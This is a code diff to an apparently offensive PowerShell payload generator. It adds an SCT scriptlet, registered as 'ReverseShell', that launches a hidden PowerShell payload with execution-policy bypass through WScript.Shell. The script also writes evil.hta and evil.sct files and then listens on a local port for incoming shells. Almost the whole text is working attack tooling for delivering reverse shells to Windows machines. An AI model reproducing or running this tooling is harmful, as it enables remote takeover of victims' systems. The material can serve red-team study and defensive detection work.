@@ -240,10 +240,33 @@ $HTA = @"
     </html>
 "@
 
+# SCT File creation - Colby Burkett
+$SCT = @"
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="ReverseShell"
+    classid="{F0001111-0000-0000-0000-0000DEADBEEF}" >
+
+    <script language="JScript">
+		<![CDATA[
+           	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+            c = "$PowerShell_Payload";
+            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
+		]]>
+	</script>
+    </registration>
+</scriptlet>
+"@
+
+Out-File -InputObject $SCT -FilePath $OutputPath -Encoding default
+
 Write-Host "`n [*] PowerShell Payload: [*]`n`n$PowerShell_Payload";
 Write-Host "`n [*] CMD Payload: [*]`n`n$CMD_Payload`n";
 Write-Host "`n [*] HTA Payload: [*]`n`n"Evil.HTA"`n";
 Out-File -FilePath .\evil.hta -InputObject $HTA -Encoding ASCII
+Write-Host "`n [*] SCT Payload: [*]`n`n"Evil.SCT"`n";
+Out-File -FilePath .\evil.sct -InputObject $SCT -Encoding ASCII
 
 $Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
 Write-Host "`n [*] Listening on Port `"$Local_Port`" [*]";
